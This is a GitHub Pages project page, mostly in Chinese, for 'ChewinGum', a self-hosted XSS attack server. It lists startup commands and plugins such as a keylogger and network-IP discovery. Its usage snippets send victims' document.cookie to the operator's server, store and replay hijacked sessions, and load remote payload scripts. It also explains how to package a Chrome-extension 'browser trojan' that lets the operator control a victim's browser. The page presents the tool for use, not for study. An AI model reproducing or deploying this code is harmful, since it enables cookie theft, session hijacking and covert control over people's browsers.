<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <meta name="description" content="ChewinGum : ChewinGum" />

    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">

    <title>ChewinGum</title>
  </head>

  <body>

    <!-- HEADER -->
    <div id="header_wrap" class="outer">
        <header class="inner">
          <a id="forkme_banner" href="https://github.com/quininer/gum">View on GitHub</a>

          <h1 id="project_title">ChewinGum</h1>
          <h2 id="project_tagline">ChewinGum</h2>

            <section id="downloads">
              <a class="zip_download_link" href="https://github.com/quininer/gum/zipball/master">Download this project as a .zip file</a>
              <a class="tar_download_link" href="https://github.com/quininer/gum/tarball/master">Download this project as a tar.gz file</a>
            </section>
        </header>
    </div>

    <!-- MAIN CONTENT -->
    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <h1>
<a name="chewingum-alpha0203451140505" class="anchor" href="#chewingum-alpha0203451140505"><span class="octicon octicon-link"></span></a>ChewinGum [alpha][0.20345][1140505]</h1>

<h2>
<a name="name" class="anchor" href="#name"><span class="octicon octicon-link"></span></a>Name</h2>

<p><strong><em>ChewinGum - individual XSS Server</em></strong></p>

<h2>
<a name="startup" class="anchor" href="#startup"><span class="octicon octicon-link"></span></a>Startup</h2>

<pre><code>python ./config.py install [ salt filekeyPath | -h ]
python ./chewingum.py [ host port debug | -h ]
</code></pre>

<h2>
<a name="dependencies" class="anchor" href="#dependencies"><span class="octicon octicon-link"></span></a>Dependencies</h2>

<ul>
<li><a href="http://bottlepy.org/">Bottle-0.12</a></li>
<li>
<p><a href="https://github.com/zeekay/bottle-websocket/">Bottle-websocket</a></p>

<h2>
<a name="unnecessaries" class="anchor" href="#unnecessaries"><span class="octicon octicon-link"></span></a>unnecessaries</h2>

<ul>
<li><a href="http://beaker.rtfd.org/">Beaker</a></li>
</ul>
</li>
</ul><h2>
<a name="reference" class="anchor" href="#reference"><span class="octicon octicon-link"></span></a>Reference</h2>

<ul>
<li>Gum.js - <a href="http://zone.wooyun.org/content/2113">xss.js</a>
</li>
<li>get_info.js - <a href="http://beefproject.com/">BeEF</a>
</li>
<li>wec_cssbug.html - <a href="http://www.web-tinker.com/article/20339.html">CSS3事件的消息回调BUG</a>
</li>
<li>get_networkip.js - <a href="http://net.ipcalf.com/">Network IP Address via ipcalf.com</a>
</li>
<li>tool_keylogger.js - <a href="http://wiremask.eu/xss-keylogger/">XSS keylogger</a>
</li>
</ul><h2>
<a name="helptext" class="anchor" href="#helptext"><span class="octicon octicon-link"></span></a>Helptext</h2>

<p><strong>1.Login</strong></p>

<p>采用filekey验证, 上传filekey或输入URL便可登录.</p>

<p><strong>2.Server</strong></p>

<p>server处代码会直接在项目触发时执行,<br>
最终会将变量serverinfo和变量browserinfo保存至数据库,<br>
格式需为json/dict格式</p>

<pre><code>{'name':'value'}
</code></pre>

<p>如:</p>

<pre><code>serverinfo = {
    'referer':b64encode(str(request.headers.get('Referer'))),
    'ctime':b64encode(str(ctime()))
}
browserinfo = {
    'cookie':b64encode(str(request.forms.get('cookie')))
}
</code></pre>

<p><strong>3.Server code keyword</strong></p>

<p>ifstatus<br>
对变量ifstatus赋值, 会触发对应status.<br>
如:</p>

<pre><code>ifstatus = 404
</code></pre>

<p>returns<br>
对变量returns赋值，在iferror为空的情况下, 会返回对其赋值的内容.<br>
如:</p>

<pre><code>returns = '&lt;script&gt;alert(1)&lt;/script&gt;'
</code></pre>

<p>gum.backinfo<br>
客户端的关键字，是一个字典，默认用来暂时记录返回的信息。<br>
当返回之后最好清空它。</p>

<pre><code>gum.backinfo = {};
</code></pre>

<p><strong>4.Project name and Object name</strong></p>

<p>project 的项目名需是xss触发处的url或是domain.<br>
$default是默认项目, xss触发时若未发现对应项目则按照此配置进行.</p>

<pre><code>object 的项目名可随意更改.
</code></pre>

<p><strong>5.Plugins</strong></p>

<p>可以这样导入server扩展,</p>

<pre><code>with open('./static/serv/get_info.py') as files: exec files.read()
</code></pre>

<p>也可以这样</p>

<pre><code>from static.serv.email_remind import send_mail
send_mail(gum_emailremind)
</code></pre>

<blockquote>
<p>具体看扩展的写法</p>
</blockquote>

<p>可以这样导入browser插件,</p>

<pre><code>gum.script('http://' + gum.domain + '/static/brows/tool_boomerang.js')
</code></pre>

<p>这样给browser插件传参,</p>

<pre><code>gum_boomerang = {
    'object_url':'http://localhost/xss',
    'post':{'xss':'yes', 'csrf':'no'},
    'eval':function(){alert(1)}
}
</code></pre>

<p>同样的方法给server扩展传参,</p>

<pre><code>gum_keepsession = {
    'url':referer,
    'session':cookie,
    'data':{'a':'b'},
    'frequency':300,
    'endate':'2013-12-12 15:17:00'
}
</code></pre>

<p><strong>6.Set code</strong></p>

<p>这样发送browser info,</p>

<pre><code>gum.post('http://' + gum.domain + '/ing', {'cookie':document.cookie})
</code></pre>

<p>单次接收browser info可以参考上面的2.server<br>
也可以这样</p>

<pre><code>browserinfo['infoname'] = b64encode(str(request.forms.get('infoname')))
</code></pre>

<p>多次接收browser info可以像这样,</p>

<pre><code>info_cookie = str(request.forms.get('cookie'))
sessionid[referer][1]['cookie'] = info_cookie
browserinfo = b64encode(sessionid.get(referer))
</code></pre>

<blockquote>
<p>不推荐使用多次接收，默认已关闭。</p>
</blockquote>

<p><strong>7.Easy example</strong></p>

<p>使用基本探针:</p>

<p>server:</p>

<pre><code>with open('./static/serv/get_info.py') as files: exec files.read()
</code></pre>

<p>browser:</p>

<pre><code>gum.script('http://' + gum.domain + '/static/brows/get_info.js', function(){
    gum.post('http://' + gum.domain + '/ing', gum.backinfo);
    gum.backinfo = {};
})
</code></pre>

<p><strong>8.Console</strong></p>

<p>javascript文件在</p>

<pre><code>./static/brows/onexsshell.js
</code></pre>

<blockquote>
<p>尚在测试阶段。</p>
</blockquote>

<p><strong>9.Browser trojan</strong></p>

<p>chrome<br>
修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口<br>
使用chrome or chromium打包<br>
安装在目标的浏览器后，使用console即可操作目标浏览器。  </p>

<blockquote>
<p>尚在测试阶段</p>
</blockquote>

<p><strong>10.Plugins header specification</strong></p>

<pre><code>Author[Reference] - Date
    Name - Dependencies
            - Synopsis
        Example
            and
        Dependencies Plus
</code></pre>

<blockquote>
<p>好吧我知道不会有人帮我写插件的...</p>
</blockquote>
      </section>
    </div>

    <!-- FOOTER  -->
    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">ChewinGum maintained by <a href="https://github.com/quininer">quininer</a></p>
        <p>Published with <a href="http://pages.github.com">GitHub Pages</a></p>
      </footer>
    </div>

              <script type="text/javascript">
            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
          </script>
          <script type="text/javascript">
            try {
              var pageTracker = _gat._getTracker("Gum, XSS");
            pageTracker._trackPageview();
            } catch(err) {}
          </script>


  </body>
</html>
